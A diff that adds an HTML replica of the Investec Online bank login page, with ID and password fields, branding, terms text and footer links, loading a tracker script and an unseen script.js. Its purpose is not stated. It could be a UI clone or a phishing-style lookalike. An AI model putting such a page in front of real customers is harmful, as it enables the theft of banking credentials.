@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Investec Online</title>
+    <link rel="icon" type="image/png" href="icon.png">
+    <link rel="stylesheet" href="styles.css">
+
+<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="container">
+            <div class="logo">
+                <img src="investiclogo.png" alt="Investec" class="logo-image">
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <div class="login-card">
+            <h1 class="login-title">Welcome to Investec Online</h1>
+            
+            <form class="login-form" method="post" action="#">
+                <div class="form-group">
+                    <div class="input-wrapper">
+                        <input 
+                            type="text" 
+                            id="investec-id" 
+                            name="investec_id"
+                            class="form-input" 
+                            autocomplete="username"
+                            aria-label="Investec ID"
+                            aria-required="true"
+                        >
+                        <label for="investec-id" class="form-label">Investec ID</label>
+                    </div>
+                    <div class="error-message" id="id-error" role="alert">Investec ID is required.</div>
+                </div>
+
+                <div class="form-group">
+                    <div class="password-wrapper">
+                        <input 
+                            type="password" 
+                            id="investec-password" 
+                            name="investec_password"
+                            class="form-input" 
+                            autocomplete="current-password"
+                            aria-label="Investec password"
+                            aria-required="true"
+                        >
+                        <label for="investec-password" class="form-label">Investec password</label>
+                        <button type="button" class="show-password" id="show-password" aria-label="Show password">Show</button>
+                    </div>
+                    <div class="error-message" id="password-error" role="alert">Password is required.</div>
+                </div>
+
+                <div class="form-group checkbox-group">
+                    <label class="checkbox-label">
+                        <input type="checkbox" id="remember-me" name="remember_me" class="checkbox-input" aria-label="Remember my Investec ID">
+                        <span class="checkbox-text">Remember my Investec ID</span>
+                    </label>
+                </div>
+
+                <a href="#" class="trouble-link">Trouble logging in?</a>
+
+                <button type="submit" class="login-button" id="login-button" disabled>Log in</button>
+
+                <div class="terms-text">
+                    By logging in to Investec Online, you are confirming that you have read and agreed to the <a href="#" class="terms-link">terms and conditions</a> applicable to dealing with Investec over the internet.
+                </div>
+            </form>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <h2 class="footer-title">Login to other Investec accounts</h2>
+            
+            <div class="footer-links">
+                <div class="footer-column">
+                    <a href="#" class="footer-link">Investec Save</a>
+                    <a href="#" class="footer-link">Channel Islands Trust & Corporate</a>
+                </div>
+                <div class="footer-column">
+                    <a href="#" class="footer-link">Asset Management Indicator</a>
+                    <a href="#" class="footer-link">Private Banking Switzerland</a>
+                </div>
+                <div class="footer-column">
+                    <a href="#" class="footer-link">Investec Capital Solutions</a>
+                    <a href="#" class="footer-link">Structured Products for IFAs</a>
+                </div>
+                <div class="footer-column">
+                    <a href="#" class="footer-link">Securities Research</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html>
